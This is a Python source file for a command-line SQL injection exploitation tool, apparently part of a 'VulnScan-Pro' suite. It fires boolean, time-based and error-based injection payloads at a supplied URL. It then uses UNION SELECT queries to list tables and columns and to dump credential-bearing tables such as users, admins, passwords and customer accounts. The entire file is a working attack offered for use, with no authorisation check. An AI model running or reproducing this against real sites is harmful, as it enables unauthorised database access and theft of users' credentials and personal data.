#!/usr/bin/env python3
"""
SQL Injection Exploitation Module for VulnScan-Pro
Author: ABN-BOOS
Description: Advanced SQL Injection exploitation tool for detected vulnerabilities
"""

import requests
import time
import sys
import json
import urllib3
from urllib.parse import urljoin

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class SQLiExploiter:
    def __init__(self, target_url, verbose=False):
        self.target = target_url
        self.verbose = verbose
        self.session = requests.Session()
        self.session.verify = False
        self.vulnerable = False
        
    def log(self, message):
        """Log messages with timestamp"""
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] {message}")
        
    def detect_injection_point(self):
        """Detect SQL injection vulnerability"""
        self.log("Scanning for SQL Injection vulnerabilities...")
        
        tests = [
            # Boolean-based tests
            {"payload": "' AND '1'='1", "expected": True},
            {"payload": "' AND '1'='2", "expected": False},
            
            # Time-based tests
            {"payload": "' AND SLEEP(5)--", "test": "time", "delay": 3},
            {"payload": "' OR IF(1=1,SLEEP(3),0)--", "test": "time", "delay": 2},
            
            # Error-based tests
            {"payload": "' AND 1=CAST((SELECT version()) AS INT)--", "test": "error"},
            {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x3a,version()))--", "test": "error"}
        ]
        
        for test in tests:
            try:
                url = f"{self.target}{test['payload']}"
                start_time = time.time()
                response = self.session.get(url, timeout=10)
                response_time = time.time() - start_time
                
                if test.get('test') == 'time' and response_time > test['delay']:
                    self.log(f"‚è±Ô∏è TIME-BASED INJECTION DETECTED: {test['payload']}")
                    self.vulnerable = True
                    return True
                    
                elif test.get('test') == 'error' and 'error' in response.text.lower():
                    self.log(f"üö® ERROR-BASED INJECTION DETECTED: {test['payload']}")
                    self.vulnerable = True
                    return True
                    
                elif self.verbose:
                    self.log(f"Tested: {test['payload']} - Time: {response_time:.2f}s")
                    
            except requests.exceptions.Timeout:
                self.log(f"‚è±Ô∏è Request timeout with: {test['payload']}")
                self.vulnerable = True
                return True
            except Exception as e:
                if self.verbose:
                    self.log(f"Error with {test['payload']}: {str(e)}")
        
        return False
    
    def get_database_info(self):
        """Extract database information"""
        if not self.vulnerable:
            self.log("Target not vulnerable. Cannot extract information.")
            return None
            
        self.log("Extracting database information...")
        
        info = {}
        
        # Get database version
        payloads = {
            "version": "' UNION SELECT 1,version(),3,4,5--",
            "database": "' UNION SELECT 1,database(),3,4,5--",
            "user": "' UNION SELECT 1,user(),3,4,5--",
            "hostname": "' UNION SELECT 1,@@hostname,3,4,5--"
        }
        
        for key, payload in payloads.items():
            try:
                url = f"{self.target}{payload}"
                response = self.session.get(url)
                info[key] = self.extract_union_data(response.text)
                self.log(f"üìä {key.upper()}: {info[key]}")
            except Exception as e:
                info[key] = f"Error: {str(e)}"
                
        return info
    
    def extract_tables(self, db_name=None):
        """Extract table names from database"""
        self.log("Extracting database tables...")
        
        if db_name:
            payload = f"' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='{db_name}'--"
        else:
            payload = "' UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema=database()--"
            
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url)
            tables = self.extract_union_data(response.text)
            
            if tables:
                table_list = tables.split(',')
                self.log(f"üìë Found {len(table_list)} tables:")
                for table in table_list:
                    self.log(f"   ‚îî‚îÄ {table}")
                return table_list
                
        except Exception as e:
            self.log(f"Error extracting tables: {str(e)}")
            
        return []
    
    def extract_columns(self, table_name):
        """Extract column names from table"""
        self.log(f"Extracting columns from '{table_name}'...")
        
        payload = f"' UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='{table_name}'--"
        
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url)
            columns = self.extract_union_data(response.text)
            
            if columns:
                column_list = columns.split(',')
                self.log(f"üóÇÔ∏è Found {len(column_list)} columns in '{table_name}':")
                for column in column_list:
                    self.log(f"   ‚îî‚îÄ {column}")
                return column_list
                
        except Exception as e:
            self.log(f"Error extracting columns: {str(e)}")
            
        return []
    
    def dump_table_data(self, table_name, columns=None):
        """Dump data from specific table"""
        self.log(f"Dumping data from '{table_name}'...")
        
        if not columns:
            columns = self.extract_columns(table_name)
            if not columns:
                self.log("No columns found or accessible")
                return []
        
        # Take first 5 columns for demonstration
        selected_columns = columns[:5]
        columns_str = ', '.join(selected_columns)
        
        payload = f"' UNION SELECT 1,CONCAT_WS(' | ', {columns_str}),3,4,5 FROM {table_name} LIMIT 10--"
        
        try:
            url = f"{self.target}{payload}"
            response = self.session.get(url)
            data = self.extract_union_data(response.text)
            
            if data and 'error' not in data.lower():
                self.log(f"üì• Data from '{table_name}':")
                self.log(f"   {data}")
                return data
            else:
                self.log("No data found or access denied")
                
        except Exception as e:
            self.log(f"Error dumping data: {str(e)}")
            
        return None
    
    def extract_union_data(self, html):
        """Extract data from UNION-based injection responses"""
        # Simple extraction - can be enhanced based on actual page structure
        lines = html.split('\n')
        for line in lines:
            if any(keyword in line for keyword in ['admin', 'user', 'test', 'mysql']):
                # Clean HTML tags
                import re
                clean_line = re.sub('<[^<]+?>', '', line).strip()
                if len(clean_line) > 5 and len(clean_line) < 500:
                    return clean_line
        return "Data extraction failed - check page structure"
    
    def advanced_exploitation(self):
        """Perform advanced exploitation techniques"""
        self.log("Starting advanced exploitation...")
        
        # Get database info
        db_info = self.get_database_info()
        if not db_info:
            return
            
        # Extract tables
        tables = self.extract_tables(db_info.get('database'))
        
        # Focus on interesting tables
        interesting_tables = [t for t in tables if any(keyword in t.lower() for keyword in ['user', 'admin', 'password', 'customer', 'account'])]
        
        for table in interesting_tables:
            self.log(f"üîç Analyzing interesting table: {table}")
            columns = self.extract_columns(table)
            
            # Look for credential columns
            cred_columns = [c for c in columns if any(keyword in c.lower() for keyword in ['pass', 'user', 'email', 'hash'])]
            
            if cred_columns:
                self.log(f"üéØ Potential credential columns found: {cred_columns}")
                self.dump_table_data(table, cred_columns)
    
    def exploit(self):
        """Main exploitation method"""
        self.log("üöÄ Starting SQL Injection Exploitation")
        self.log("=" * 60)
        
        # Detect vulnerability
        if not self.detect_injection_point():
            self.log("‚ùå No SQL Injection vulnerability detected")
            return False
            
        self.log("‚úÖ SQL Injection vulnerability confirmed!")
        
        # Perform exploitation
        self.advanced_exploitation()
        
        self.log("=" * 60)
        self.log("üéØ Exploitation completed")
        return True

def main():
    if len(sys.argv) < 2:
        print("SQL Injection Exploitation Tool")
        print("Usage: python3 sql_exploit.py <TARGET_URL> [--verbose]")
        print("\nExamples:")
        print("  python3 sql_exploit.py \"https://example.com/page.php?id=1\"")
        print("  python3 sql_exploit.py \"https://example.com/?id=1\" --verbose")
        sys.exit(1)
    
    target_url = sys.argv[1]
    verbose = "--verbose" in sys.argv
    
    # Ensure URL has parameter
    if '?' not in target_url and '=' not in target_url:
        target_url += "?id=1"
    
    exploiter = SQLiExploiter(target_url, verbose=verbose)
    exploiter.exploit()

if __name__ == "__main__":
    main()